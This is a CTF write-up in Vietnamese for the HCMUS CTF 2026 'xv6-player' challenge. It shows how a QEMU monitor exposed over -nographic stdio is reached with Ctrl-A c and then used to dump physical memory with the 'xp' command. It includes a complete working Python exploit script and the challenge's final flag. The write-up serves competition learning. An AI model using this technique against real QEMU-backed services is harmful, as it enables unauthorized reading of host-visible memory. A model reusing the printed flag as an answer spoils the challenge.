# xv6-player — HCMUS CTF 2026

**Category:** Pwnable  
**Tags:** `xv6` · `qemu monitor exposure` · `physical memory leak` · `-nographic` · `hmp xp`

---

## 1. Mô tả bài

Bài cho mình upload một chương trình nhỏ để chạy trong môi trường xv6-riscv. Lúc đầu nhìn patch thì khá dễ bị kéo theo hướng kernel / allocator vì tác giả có sửa phần cấp phát page để giấu page chứa flag.

Nhưng sau khi xem kỹ wrapper chạy challenge thì bug thật lại không nằm trong xv6 bên trong, mà nằm ở **cách QEMU được expose ra ngoài**.

Ý tưởng solve của mình rất thẳng:

- kết nối tới service,
- cho QEMU boot,
- chuyển sang monitor của QEMU,
- đọc thẳng physical memory chứa flag.

Tức là không cần exploit trong guest nữa.

---

## 2. Bug chính

Challenge chạy QEMU ở chế độ `-nographic`.

Khi QEMU chạy kiểu này, guest serial console và monitor của QEMU có thể bị ghép chung trên `stdio`. Nếu không chặn kỹ thì người chơi có thể dùng tổ hợp:

```text
Ctrl-A c
```

để chuyển từ màn hình guest sang `(qemu)` monitor.

Đây là bug quyết định của bài. Vì một khi đã vào được monitor, mình có thể dùng luôn command của QEMU để inspect máy ảo từ bên ngoài. Tới lúc đó thì việc xv6 có panic hay không gần như không còn quan trọng nữa.

---

## 3. Quan sát khi chạy

Script của mình chỉ gửi input rất nhỏ:

```text
0\n
```

Sau đó phía guest thường đi tới trạng thái kiểu:

```text
xv6 kernel is booting
panic: exec
```

Nhìn thì có vẻ fail, nhưng thực ra đây chỉ là **guest panic**. Process QEMU ở ngoài vẫn sống, nên mình vẫn gửi được `Ctrl-A c` để nhảy sang monitor.

Flow thực tế là:

1. connect tới service,
2. gửi `0\n` để QEMU boot,
3. guest có `panic: exec` cũng không sao,
4. gửi `Ctrl-A c`,
5. vào `(qemu)` monitor và dump memory.


---

## 4. Dùng monitor để leak flag

Sau khi vào được monitor, mình dùng lệnh `xp` của QEMU:

```text
xp /16bx 0x87fff000
```

Trong đó:

- `xp` là lệnh examine physical memory,
- `/16bx` nghĩa là đọc 16 byte ở dạng hex byte,
- `0x87fff000` là physical page chứa flag.

Output có dạng:

```text
0000000087fff000: 0x48 0x43 0x4d 0x55 0x53 0x2d 0x43 0x54
0000000087fff008: 0x46 0x7b 0x33 0x36 0x5f 0x68 0x6f 0x75
```

Đổi sang ASCII là thấy ngay đầu chuỗi:

```text
HCMUS-CTF{36_hou...
```

Tới đây thì coi như bài xong ý tưởng rồi. Phần còn lại chỉ là dump đủ dài và ghép lại thành full flag.

---

## 5. Flow của script solve

```
#!/usr/bin/env python3
"""
Robust exploit for xv6-player.

Usage:
    ./solve_xv6_player.py HOST PORT

The bug is QEMU monitor exposure through -nographic stdio-mux.  The flag page is
at guest physical address 0x87fff000.  This version dumps in small chunks and
only prints a complete HCMUS-CTF{...} flag, so punctuation such as '*' is safe.
"""
import argparse
import re
import select
import socket
import sys
import time

FLAG_PHYS = 0x87FFF000
FLAG_RE = re.compile(rb"HCMUS[-_]CTF\{[ -~]{1,300}?\}")


def drain(sock: socket.socket, timeout: float = 0.3) -> bytes:
    """Read whatever is currently available."""
    end = time.time() + timeout
    out = bytearray()
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], max(0.0, end - time.time()))
        if not r:
            break
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            continue
        if not chunk:
            break
        out += chunk
        # Extend slightly after data arrives to coalesce network fragments.
        end = max(end, time.time() + 0.08)
    return bytes(out)


def read_until_prompt(sock: socket.socket, timeout: float = 3.0) -> bytes:
    """Read until the QEMU HMP prompt appears after a command."""
    end = time.time() + timeout
    out = bytearray()
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], max(0.0, end - time.time()))
        if not r:
            continue
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            continue
        if not chunk:
            break
        out += chunk
        # HMP prints a new prompt after command output.  Give it one tiny extra
        # read so the final line is not cut in the middle on slow links.
        if b"(qemu)" in out:
            out += drain(sock, 0.15)
            break
    return bytes(out)


def enter_monitor(sock: socket.socket) -> bytes:
    """Switch QEMU stdio from guest serial to HMP monitor."""
    sock.sendall(b"\x01c")  # Ctrl-A c
    return read_until_prompt(sock, 3.0)


def parse_xp_bytes(text: bytes) -> bytes:
    """Parse byte values from HMP lines like: 0000000087fff000: 0x48 ..."""
    leaked = bytearray()
    for line in text.splitlines():
        # Keep only real xp output lines.  This avoids parsing command echoes or
        # unrelated boot messages that contain ':' characters.
        if not re.match(rb"^[0-9a-fA-F]{8,16}:", line.strip()):
            continue
        rest = line.split(b":", 1)[1]
        for m in re.finditer(rb"0x([0-9a-fA-F]{1,2})\b", rest):
            leaked.append(int(m.group(1), 16))
    return bytes(leaked)


def dump_phys(sock: socket.socket, addr: int, total: int, chunk: int = 16, debug: bool = False) -> bytes:
    """Dump guest physical memory through HMP xp in small reliable chunks."""
    data = bytearray()
    for off in range(0, total, chunk):
        n = min(chunk, total - off)
        cmd = f"xp /{n}bx 0x{addr + off:x}\n".encode()
        sock.sendall(cmd)
        resp = read_until_prompt(sock, 3.0)
        if debug:
            sys.stderr.write(resp.decode(errors="replace"))
            sys.stderr.flush()
        got = parse_xp_bytes(resp)
        if len(got) != n:
            # Retry once with an even smaller command if the network split or HMP
            # output was weird.
            time.sleep(0.1)
            sock.sendall(cmd)
            resp2 = read_until_prompt(sock, 3.0)
            if debug:
                sys.stderr.write(resp2.decode(errors="replace"))
                sys.stderr.flush()
            got = parse_xp_bytes(resp2)
        data += got

        m = FLAG_RE.search(bytes(data))
        if m:
            return bytes(data)
    return bytes(data)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--dump-size", type=int, default=0x400, help="bytes to dump from the flag page")
    ap.add_argument("--debug", action="store_true", help="show raw QEMU monitor responses")
    ap.add_argument("--boot-delay", type=float, default=1.5)
    args = ap.parse_args()

    with socket.create_connection((args.host, args.port), timeout=10) as sock:
        sock.setblocking(False)

        banner = drain(sock, 2.0)
        if args.debug:
            sys.stderr.write(banner.decode(errors="replace"))
            sys.stderr.flush()

        # Send a zero-length init program.  xv6 may panic on exec, but QEMU stays
        # alive and the exposed monitor remains usable.
        sock.sendall(b"0\n")
        time.sleep(args.boot_delay)
        boot = drain(sock, 0.8)
        if args.debug:
            sys.stderr.write(boot.decode(errors="replace"))
            sys.stderr.flush()

        mon = enter_monitor(sock)
        if args.debug:
            sys.stderr.write(mon.decode(errors="replace"))
            sys.stderr.flush()

        blob = dump_phys(sock, FLAG_PHYS, args.dump_size, chunk=16, debug=args.debug)

    m = FLAG_RE.search(blob)
    if m:
        print(m.group(0).decode(errors="replace"))
        return 0

    # No fake success: show useful recovered printable data for manual inspection.
    printable = ''.join(chr(c) if 32 <= c < 127 else '.' for c in blob)
    print("[-] Complete flag was not found.", file=sys.stderr)
    print(f"[-] Dumped {len(blob)} bytes from 0x{FLAG_PHYS:x}.", file=sys.stderr)
    print(printable, file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

```

### Bước 1 — Kết nối tới service

Script mở socket tới host/port của challenge và đọc banner ban đầu.

### Bước 2 — Gửi chương trình rỗng

Mình gửi:

```text
0\n
```

Mục tiêu chỉ là để QEMU bắt đầu boot. Không cần payload trong guest.

### Bước 3 — Chuyển sang QEMU monitor

Script gửi:

```python
b"\x01c"
```

Đây chính là `Ctrl-A c`. Nếu thành công thì sẽ thấy prompt:

```text
(qemu)
```

### Bước 4 — Dump flag page theo từng chunk nhỏ

Thay vì dùng một lệnh dài, script gửi lần lượt:

```text
xp /16bx 0x87fff000
xp /16bx 0x87fff010
xp /16bx 0x87fff020
...
```

Mỗi lần script chỉ parse đúng các dòng có dạng địa chỉ vật lý rồi lấy các byte hex bên phải dấu `:`.

Lý do phải làm vậy là vì output remote khá dễ bị cắt packet. Nếu dump dài một phát thì rất dễ bị ăn thiếu dữ liệu, giống trường hợp chỉ leak được nửa flag lúc đầu.

### Bước 5 — Ghép lại và match regex flag

Sau khi parse các byte từ `xp`, script ghép lại thành blob rồi dùng regex:

```python
HCMUS[-_]CTF\{[ -~]{1,300}?\}
```

Khi thấy full flag thì dừng luôn.


---

## 6. Điểm dễ sai

**1. Tưởng `panic: exec` là fail hẳn.**  
Thật ra chỉ guest chết, còn QEMU vẫn sống và monitor vẫn dùng được.

**2. Dump quá dài trong một lần.**  
Remote dễ trả output không trọn gói, dẫn tới parse thiếu và chỉ nhìn thấy một phần flag.

**3. Parse bừa cả output boot.**  
Script cần lọc đúng các dòng `xp` có format địa chỉ rồi mới lấy byte, nếu không rất dễ ghép nhầm dữ liệu.

---

## 7. Tóm tắt

Bài này bản chất là một bài **QEMU monitor exposure** chứ không phải kernel pwn trong xv6.

Chain solve rất ngắn:

- service expose QEMU với `-nographic`,
- monitor bị lộ trên stdio,
- dùng `Ctrl-A c` để vào `(qemu)`,
- dùng `xp` đọc physical memory ở `0x87fff000`,
- ghép bytes lại thành flag.

```
Flag: HCMUS-CTF{36_hours_is_not_enough_for_a_*real*_linux_kernel_CVE}
```

